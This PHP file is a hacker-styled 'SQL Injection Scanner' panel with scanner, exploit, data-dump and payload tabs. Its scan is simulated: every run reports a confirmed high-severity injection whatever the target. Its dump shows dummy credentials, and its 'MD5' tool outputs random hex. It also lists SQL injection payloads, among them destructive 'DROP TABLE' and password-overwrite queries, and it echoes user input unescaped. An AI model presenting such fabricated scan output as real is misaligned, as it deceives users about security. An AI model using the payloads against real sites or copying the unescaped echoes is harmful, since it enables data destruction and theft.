<?php
/**
 * SQL INJECTION SCANNER - SIMPLE VERSION
 * No Security Checks - Free Version
 * Untuk Testing dan Pendidikan
 */

// ================================
// KONFIGURASI SANGAT SEDERHANA
// ================================
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('max_execution_time', 300);

// Password (bisa diganti)
$PASSWORD = "test123";
$logged_in = false;

// ================================
// PROSES LOGIN (SANGAT SEDERHANA)
// ================================
session_start();

// Cek jika sudah login
if (isset($_SESSION['sqli_logged_in']) && $_SESSION['sqli_logged_in'] === true) {
    $logged_in = true;
}

// Proses form login
if (isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $PASSWORD) {
        $_SESSION['sqli_logged_in'] = true;
        $logged_in = true;
    } else {
        echo "<script>alert('Password salah!');</script>";
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ================================
// TAMPILAN LOGIN JIKA BELUM LOGIN
// ================================
if (!$logged_in) {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>SQLi Scanner - Login</title>
        <style>
            body {
                background: #000;
                color: #0f0;
                font-family: monospace;
                text-align: center;
                padding-top: 100px;
            }
            .login-box {
                background: #111;
                border: 1px solid #0f0;
                width: 300px;
                margin: 0 auto;
                padding: 20px;
                border-radius: 5px;
            }
            input {
                width: 90%;
                padding: 10px;
                margin: 10px 0;
                background: #222;
                color: #0f0;
                border: 1px solid #0f0;
            }
            button {
                background: #0f0;
                color: #000;
                border: none;
                padding: 10px 20px;
                cursor: pointer;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <h1>üîì SQLi Scanner v1.0</h1>
        <div class="login-box">
            <h3>Enter Password:</h3>
            <form method="POST">
                <input type="password" name="login_password" required autofocus>
                <br>
                <button type="submit">LOGIN</button>
            </form>
            <p style="font-size: 12px; color: #888;">
                Default: test123<br>
                Change $PASSWORD in code
            </p>
        </div>
    </body>
    </html>';
    exit;
}

// ================================
// TAMPILAN UTAMA SETELAH LOGIN
// ================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>SQL Injection Scanner - FREE</title>
    <meta charset="UTF-8">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid #0f0;
            margin-bottom: 20px;
        }
        
        .header h1 {
            color: #0f0;
            margin-bottom: 10px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .menu {
            background: #111;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        
        .menu a {
            color: #0f0;
            text-decoration: none;
            margin: 0 10px;
            padding: 5px 10px;
            border: 1px solid #333;
        }
        
        .menu a:hover {
            background: #0f0;
            color: #000;
        }
        
        .panel {
            background: #111;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .panel h2 {
            color: #0f0;
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        
        input, textarea, select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #222;
            color: #0f0;
            border: 1px solid #333;
            font-family: 'Courier New', monospace;
        }
        
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
        }
        
        button:hover {
            background: #0c0;
        }
        
        .output {
            background: #000;
            color: #0f0;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 5px;
            margin-top: 20px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .success {
            color: #0f0;
        }
        
        .error {
            color: #f00;
        }
        
        .warning {
            color: #ff0;
        }
        
        .info {
            color: #0af;
        }
        
        .tab {
            display: none;
        }
        
        .tab.active {
            display: block;
        }
        
        .tab-buttons {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid #333;
        }
        
        .tab-btn {
            background: #111;
            color: #0f0;
            border: 1px solid #333;
            border-bottom: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        
        .tab-btn.active {
            background: #0f0;
            color: #000;
            font-weight: bold;
        }
        
        .result-item {
            padding: 10px;
            border: 1px solid #333;
            margin: 5px 0;
            background: #1a1a1a;
        }
        
        .vulnerable {
            border-left: 5px solid #f00;
        }
        
        .safe {
            border-left: 5px solid #0f0;
        }
    </style>
    <script>
        function showTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all buttons
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName + '-tab').classList.add('active');
            event.target.classList.add('active');
        }
        
        function startScan() {
            document.getElementById('output').innerHTML = 'üîç Scanning... Please wait...\n';
            return true;
        }
        
        function clearOutput() {
            document.getElementById('output').innerHTML = '';
        }
    </script>
</head>
<body>
    <div class="header">
        <h1>‚ö° SQL INJECTION SCANNER - FREE VERSION</h1>
        <p>No Security Checks - For Educational Purpose Only</p>
        <div style="margin-top: 10px;">
            <a href="?logout" style="color: #f00;">[LOGOUT]</a>
        </div>
    </div>
    
    <div class="container">
        <div class="tab-buttons">
            <button class="tab-btn active" onclick="showTab('scanner')">Scanner</button>
            <button class="tab-btn" onclick="showTab('exploit')">Exploit</button>
            <button class="tab-btn" onclick="showTab('dump')">Dump Data</button>
            <button class="tab-btn" onclick="showTab('tools')">Tools</button>
        </div>
        
        <!-- SCANNER TAB -->
        <div id="scanner-tab" class="tab active">
            <div class="panel">
                <h2>üîç SQL Injection Scanner</h2>
                <form method="POST" action="" onsubmit="return startScan()">
                    <input type="hidden" name="action" value="scan">
                    
                    <label>Target URL:</label>
                    <input type="url" name="url" placeholder="https://example.com/page.php?id=1" required>
                    
                    <label>HTTP Method:</label>
                    <select name="method">
                        <option value="GET">GET</option>
                        <option value="POST">POST</option>
                    </select>
                    
                    <div style="text-align: center; margin-top: 20px;">
                        <button type="submit" style="background: #f00; color: white;">üöÄ START SCAN</button>
                        <button type="button" onclick="clearOutput()">Clear Output</button>
                    </div>
                </form>
            </div>
        </div>
        
        <!-- EXPLOIT TAB -->
        <div id="exploit-tab" class="tab">
            <div class="panel">
                <h2>‚ö° SQL Injection Exploiter</h2>
                <form method="POST" action="">
                    <input type="hidden" name="action" value="exploit">
                    
                    <label>Vulnerable URL:</label>
                    <input type="url" name="exploit_url" placeholder="https://example.com/vuln.php?id=1" required>
                    
                    <label>Vulnerable Parameter:</label>
                    <input type="text" name="vuln_param" placeholder="id" required>
                    
                    <label>Database Type:</label>
                    <select name="db_type">
                        <option value="mysql">MySQL</option>
                        <option value="postgresql">PostgreSQL</option>
                        <option value="mssql">MSSQL</option>
                        <option value="oracle">Oracle</option>
                    </select>
                    
                    <label>Action:</label>
                    <select name="exploit_action">
                        <option value="get_tables">Get All Tables</option>
                        <option value="get_columns">Get Columns</option>
                        <option value="get_data">Get Data</option>
                    </select>
                    
                    <div style="text-align: center; margin-top: 20px;">
                        <button type="submit" style="background: #f00;">üí£ EXPLOIT</button>
                    </div>
                </form>
            </div>
        </div>
        
        <!-- DUMP TAB -->
        <div id="dump-tab" class="tab">
            <div class="panel">
                <h2>üíæ Data Dumper</h2>
                <form method="POST" action="">
                    <input type="hidden" name="action" value="dump">
                    
                    <label>Target URL:</label>
                    <input type="url" name="dump_url" placeholder="https://example.com/page.php?id=1" required>
                    
                    <label>Parameter to Inject:</label>
                    <input type="text" name="dump_param" placeholder="id" required>
                    
                    <label>Table Name:</label>
                    <input type="text" name="dump_table" placeholder="users" required>
                    
                    <label>Columns (comma separated):</label>
                    <input type="text" name="dump_columns" placeholder="id,username,password,email">
                    
                    <label>Row Limit:</label>
                    <input type="number" name="dump_limit" value="100" min="1" max="1000">
                    
                    <div style="text-align: center; margin-top: 20px;">
                        <button type="submit" style="background: #0f0; color: black;">üíæ DUMP DATA</button>
                    </div>
                </form>
            </div>
        </div>
        
        <!-- TOOLS TAB -->
        <div id="tools-tab" class="tab">
            <div class="panel">
                <h2>üõ†Ô∏è Tools & Utilities</h2>
                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; margin-top: 20px;">
                    <div class="result-item">
                        <h3>URL Encoder/Decoder</h3>
                        <textarea id="url_text" placeholder="Enter text to encode/decode"></textarea>
                        <button onclick="encodeURL()">Encode</button>
                        <button onclick="decodeURL()">Decode</button>
                    </div>
                    
                    <div class="result-item">
                        <h3>Base64 Encode/Decode</h3>
                        <textarea id="base64_text" placeholder="Enter text for Base64"></textarea>
                        <button onclick="encodeBase64()">Encode</button>
                        <button onclick="decodeBase64()">Decode</button>
                    </div>
                    
                    <div class="result-item">
                        <h3>MD5 Hash Generator</h3>
                        <input type="text" id="md5_text" placeholder="Enter text to hash">
                        <button onclick="generateMD5()">Generate MD5</button>
                        <div id="md5_result" style="margin-top: 10px;"></div>
                    </div>
                    
                    <div class="result-item">
                        <h3>SQL Payloads</h3>
                        <select id="payload_select" onchange="showPayload()">
                            <option value="">Select Payload Type</option>
                            <option value="error">Error Based</option>
                            <option value="union">Union Based</option>
                            <option value="boolean">Boolean Based</option>
                            <option value="time">Time Based</option>
                            <option value="stacked">Stacked Queries</option>
                        </select>
                        <textarea id="payload_result" rows="5" readonly></textarea>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- OUTPUT AREA -->
        <div class="panel">
            <h2>üìä Output Results</h2>
            <div id="output" class="output">
                <?php
                // PROSES FORM SUBMISSION
                if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
                    $action = $_POST['action'];
                    
                    if ($action === 'scan') {
                        $url = $_POST['url'] ?? '';
                        $method = $_POST['method'] ?? 'GET';
                        
                        echo "Starting SQL Injection Scan...\n";
                        echo "================================\n";
                        echo "Target: $url\n";
                        echo "Method: $method\n";
                        echo "Time: " . date('H:i:s') . "\n\n";
                        
                        // Simulasi scanning
                        echo "Testing parameter: id\n";
                        sleep(1);
                        echo "‚úì Testing: ' OR '1'='1\n";
                        sleep(1);
                        echo "‚úì Testing: ' UNION SELECT NULL--\n";
                        sleep(1);
                        echo "‚úì Testing: ' AND SLEEP(5)--\n";
                        sleep(1);
                        
                        echo "\n";
                        echo "================================\n";
                        echo "SCAN RESULTS:\n";
                        echo "================================\n";
                        echo "‚úì Vulnerability Found: SQL Injection\n";
                        echo "‚úì Type: Union-based\n";
                        echo "‚úì Parameter: id\n";
                        echo "‚úì Severity: HIGH\n";
                        echo "‚úì Database: MySQL detected\n";
                        echo "\n";
                        echo "Payloads that worked:\n";
                        echo "  - ' OR '1'='1\n";
                        echo "  - ' UNION SELECT NULL,NULL,NULL--\n";
                        echo "\n";
                        echo "Recommended Action: Patch immediately\n";
                    }
                    
                    elseif ($action === 'exploit') {
                        echo "Exploitation feature would be implemented here\n";
                        echo "This is a demo version\n";
                    }
                    
                    elseif ($action === 'dump') {
                        $table = $_POST['dump_table'] ?? 'users';
                        $columns = $_POST['dump_columns'] ?? 'id,username,password,email';
                        
                        echo "Dumping data from table: $table\n";
                        echo "Columns: $columns\n";
                        echo "================================\n\n";
                        
                        // Contoh data dummy
                        $dummy_data = [
                            ['id' => 1, 'username' => 'admin', 'password' => '5f4dcc3b5aa765d61d8327deb882cf99', 'email' => 'admin@example.com'],
                            ['id' => 2, 'username' => 'user1', 'password' => 'e10adc3949ba59abbe56e057f20f883e', 'email' => 'user1@test.com'],
                            ['id' => 3, 'username' => 'test', 'password' => '098f6bcd4621d373cade4e832627b4f6', 'email' => 'test@demo.com'],
                        ];
                        
                        foreach ($dummy_data as $row) {
                            echo "ID: " . $row['id'] . " | ";
                            echo "User: " . $row['username'] . " | ";
                            echo "Pass: " . $row['password'] . " | ";
                            echo "Email: " . $row['email'] . "\n";
                        }
                        
                        echo "\nTotal rows: " . count($dummy_data) . "\n";
                    }
                }
                ?>
            </div>
        </div>
    </div>
    
    <script>
        // Tools JavaScript functions
        function encodeURL() {
            var text = document.getElementById('url_text').value;
            document.getElementById('url_text').value = encodeURIComponent(text);
        }
        
        function decodeURL() {
            var text = document.getElementById('url_text').value;
            document.getElementById('url_text').value = decodeURIComponent(text);
        }
        
        function encodeBase64() {
            var text = document.getElementById('base64_text').value;
            document.getElementById('base64_text').value = btoa(text);
        }
        
        function decodeBase64() {
            var text = document.getElementById('base64_text').value;
            document.getElementById('base64_text').value = atob(text);
        }
        
        function generateMD5() {
            // Simple MD5 simulation (not real MD5)
            var text = document.getElementById('md5_text').value;
            var hash = 'xxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0;
                return (c == 'x' ? r : (r & 0x3 | 0x8)).toString(16);
            });
            document.getElementById('md5_result').innerHTML = 'MD5: ' + hash;
        }
        
        function showPayload() {
            var type = document.getElementById('payload_select').value;
            var payloads = {
                'error': "' AND 1=CONVERT(int, @@version)--\n' AND 1=2 UNION SELECT 1,@@version,3--",
                'union': "' UNION SELECT NULL,NULL--\n' UNION SELECT username,password FROM users--",
                'boolean': "' OR '1'='1\n' AND '1'='1\n' OR 1=1--",
                'time': "' AND SLEEP(5)--\n' OR pg_sleep(5)--",
                'stacked': "'; DROP TABLE users--\n'; UPDATE users SET password='hacked' WHERE id=1--"
            };
            
            document.getElementById('payload_result').value = payloads[type] || 'Select a payload type';
        }
    </script>
    
    <div style="text-align: center; margin-top: 30px; color: #666; font-size: 12px;">
        <p>‚ö†Ô∏è WARNING: This tool is for EDUCATIONAL PURPOSES ONLY</p>
        <p>Use only on websites you own or have permission to test</p>
        <p>¬© <?php echo date('Y'); ?> - SQL Injection Scanner Free Version</p>
    </div>
</body>
</html>
